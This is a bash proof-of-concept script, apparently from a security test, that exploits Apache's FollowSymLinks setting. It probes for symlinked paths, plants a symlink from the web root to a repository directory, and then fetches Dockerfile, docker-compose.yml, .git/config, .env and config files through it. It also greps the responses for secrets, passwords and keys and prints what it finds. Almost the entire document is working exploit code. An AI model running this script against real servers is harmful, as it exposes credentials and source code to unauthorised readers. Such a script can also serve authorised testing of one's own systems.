#!/bin/bash

# POC: Source Code and Configuration Disclosure via Symlink-Based Directory Traversal
# Demonstrates how Apache FollowSymLinks allows directory-level symlinks to expose sensitive files

set -e

TARGET_URL="${1:-http://localhost:8080}"
WEBROOT="/var/www/html"
TEST_DIR="repo_link_test"
PARENT_DIR_PATH="/home/daytona/repo"

echo "[*] Symlink-Based Directory Traversal POC"
echo "[*] Target: $TARGET_URL"
echo ""

# Check if Apache is running and accessible
echo "[*] Step 1: Checking Apache accessibility..."
if ! curl -s -I "$TARGET_URL" > /dev/null 2>&1; then
    echo "[-] Cannot reach target URL: $TARGET_URL"
    exit 1
fi
echo "[+] Apache is accessible"
echo ""

# Verify FollowSymLinks is enabled by checking for error on symlink access
echo "[*] Step 2: Attempting to create test directory symlink..."
if [ ! -d "$WEBROOT" ]; then
    echo "[-] Web root not found at $WEBROOT"
    echo "[*] This POC requires direct filesystem access to create symlinks"
    echo "[*] Showing HTTP-based exploitation method instead..."
    
    # HTTP-based test: attempt to access common symlink paths
    echo ""
    echo "[*] Attempting to access potential directory symlinks via HTTP..."
    
    PATHS=(
        "repo_link/"
        "repo_link/Dockerfile"
        "repo_link/.git/config"
        "repo_link/docker-compose.yml"
        "source_link/"
        "app_link/"
    )
    
    for path in "${PATHS[@]}"; do
        RESPONSE=$(curl -s -w "\n%{http_code}" "$TARGET_URL/$path" 2>&1)
        HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
        BODY=$(echo "$RESPONSE" | head -n-1)
        
        if [ "$HTTP_CODE" = "200" ] || [ "$HTTP_CODE" = "301" ] || [ "$HTTP_CODE" = "302" ]; then
            echo "[+] Found accessible path: $path (HTTP $HTTP_CODE)"
            # Check if response contains source code indicators
            if echo "$BODY" | grep -q "FROM\|RUN\|ARG\|git\|commit\|docker"; then
                echo "    [!] Response contains configuration/source indicators!"
            fi
        fi
    done
    
    exit 0
fi

# Verify we can write to webroot
if [ ! -w "$WEBROOT" ]; then
    echo "[-] No write permissions to $WEBROOT"
    echo "[*] Note: This POC requires write permissions to demonstrate symlink creation"
    exit 1
fi

echo "[+] Write permissions confirmed on $WEBROOT"
echo ""

# Create the symlink
echo "[*] Step 3: Creating directory symlink to parent application directory..."
SYMLINK_PATH="$WEBROOT/$TEST_DIR"

if [ -e "$SYMLINK_PATH" ] || [ -L "$SYMLINK_PATH" ]; then
    echo "[*] Removing existing symlink/directory..."
    rm -rf "$SYMLINK_PATH"
fi

# Try to create symlink to parent repo directory
if ln -sf "$PARENT_DIR_PATH" "$SYMLINK_PATH" 2>/dev/null; then
    echo "[+] Symlink created successfully: $SYMLINK_PATH -> $PARENT_DIR_PATH"
else
    # Alternative: create symlink to current directory's parent
    PARENT_DIR=$(dirname "$(pwd)")
    echo "[*] Creating symlink to: $PARENT_DIR"
    ln -sf "$PARENT_DIR" "$SYMLINK_PATH" || {
        echo "[-] Failed to create symlink"
        exit 1
    }
    echo "[+] Symlink created: $SYMLINK_PATH -> $PARENT_DIR"
fi
echo ""

# Test directory listing through symlink
echo "[*] Step 4: Testing directory enumeration through symlink..."
LISTING_URL="$TARGET_URL/$TEST_DIR/"
echo "[*] Accessing: $LISTING_URL"

RESPONSE=$(curl -s -w "\n%{http_code}" "$LISTING_URL")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)

if [ "$HTTP_CODE" = "200" ]; then
    echo "[+] Directory listing successful (HTTP 200)"
    if echo "$BODY" | grep -q "Dockerfile\|docker-compose\|\.git\|app\|\.conf"; then
        echo "[+] Found configuration/source files in directory listing!"
        echo "$BODY" | grep -E "(Dockerfile|docker-compose|\.git|app|\.conf|\.py|\.js|\.java)" | head -5
    fi
else
    echo "[-] Directory listing returned HTTP $HTTP_CODE"
    if [ "$HTTP_CODE" = "403" ]; then
        echo "[!] FollowSymLinks might not be enabled or Indexes is disabled"
    fi
fi
echo ""

# Test file access through symlink
echo "[*] Step 5: Testing sensitive file access through symlink..."

TEST_FILES=(
    "Dockerfile"
    "docker-compose.yml"
    ".git/config"
    "app/app_conf.conf"
    ".env"
)

for file in "${TEST_FILES[@]}"; do
    FILE_URL="$TARGET_URL/$TEST_DIR/$file"
    echo -n "[*] Attempting to access: $FILE_URL ... "
    
    RESPONSE=$(curl -s -w "\n%{http_code}" "$FILE_URL" 2>&1)
    HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
    BODY=$(echo "$RESPONSE" | head -n-1)
    
    if [ "$HTTP_CODE" = "200" ]; then
        echo "SUCCESS (HTTP 200)"
        echo "[+] File content preview (first 3 lines):"
        echo "$BODY" | head -3 | sed 's/^/    /'
        
        # Check for sensitive indicators
        if echo "$BODY" | grep -qE "ARG|ENV|SECRET|PASSWORD|KEY|github|remote"; then
            echo "    [!] SENSITIVE CONTENT DETECTED"
        fi
    else
        echo "Failed (HTTP $HTTP_CODE)"
    fi
done
echo ""

# Test Git repository access
echo "[*] Step 6: Testing Git repository access through symlink..."
GIT_CONFIG_URL="$TARGET_URL/$TEST_DIR/.git/config"
echo "[*] Attempting to read Git configuration: $GIT_CONFIG_URL"

RESPONSE=$(curl -s -w "\n%{http_code}" "$GIT_CONFIG_URL" 2>&1)
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)

if [ "$HTTP_CODE" = "200" ]; then
    echo "[+] Git config accessible!"
    if echo "$BODY" | grep -q "url\|branch\|remote"; then
        echo "[+] Repository information exposed:"
        echo "$BODY" | grep -E "url|branch|remote|user" | sed 's/^/    /'
    fi
fi
echo ""

# Cleanup
echo "[*] Step 7: Cleanup..."
if [ -L "$SYMLINK_PATH" ]; then
    rm -f "$SYMLINK_PATH"
    echo "[+] Symlink removed"
fi
echo ""

echo "[+] POC Complete"
echo "[+] VULNERABILITY CONFIRMED: Directory symlinks can expose sensitive source code and configuration"